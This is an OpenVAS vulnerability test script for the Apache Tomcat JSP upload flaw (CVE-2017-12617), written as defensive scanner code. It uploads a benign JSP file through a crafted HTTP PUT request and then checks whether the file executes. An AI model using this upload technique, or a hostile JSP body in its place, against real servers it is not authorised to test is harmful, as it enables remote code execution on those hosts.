###############################################################################
# OpenVAS Vulnerability Test
#
# Apache Tomcat 'HTTP PUT Request' JSP Upload Code Execution Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:tomcat";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811854");
  script_version("2019-05-10T11:41:35+0000");
  script_cve_id("CVE-2017-12617");
  script_bugtraq_id(100954);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-05-10 11:41:35 +0000 (Fri, 10 May 2019)");
  script_tag(name:"creation_date", value:"2017-09-25 17:29:27 +0530 (Mon, 25 Sep 2017)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Apache Tomcat 'HTTP PUT Request' JSP Upload Code Execution Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Apache Tomcat
  and is prone to code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted 'HTTP PUT' request and check
  whether it is able to upload arbitrary file or not.");

  script_tag(name:"insight", value:"The flaw is due to an insufficient processing
  of 'HTTP PUT Request', which allows uploading of an arbitrary JSP file to the
  target system and then request the file to execute arbitrary code on the target
  system.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary code on the target system.");

  script_tag(name:"affected", value:"Apache Tomcat versions 9.0.0.M1 to 9.0.0,
  8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81.");

  script_tag(name:"solution", value:"Upgrade to Tomcat version 7.0.82 or 8.0.47
  or 8.5.23 or 9.0.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://lists.apache.org/thread.html/3fd341a604c4e9eab39e7eaabbbac39c30101a022acc11dd09d7ebcb@%3Cannounce.tomcat.apache.org%3E");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_apache_tomcat_consolidation.nasl");
  script_mandatory_keys("apache/tomcat/http/detected");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!tomPort = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:tomPort, cpe:CPE))
  exit(0);

host = http_host_name(port:tomPort);

postData = '<% out.println("Reproducing CVE-2017-12617");%>';

vtstrings = get_vt_strings();
rand = '/' + vtstrings["lowercase_rand"] + '.jsp';
url = rand + '/';

req = string("PUT ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "\r\n", postData);
res = http_keepalive_send_recv(port:tomPort, data:req);

if(res =~ "^HTTP/1\.[01] 201")
{
  if( http_vuln_check( port:tomPort, url:rand, pattern:"Reproducing CVE-2017-12617", check_header:TRUE) )
  {
    report = 'It was possible to upload the file ' + rand + '. Please delete this file manually.\n\n';
    security_message( port:tomPort, data:report );
    exit( 0 );
  }
}

exit(99);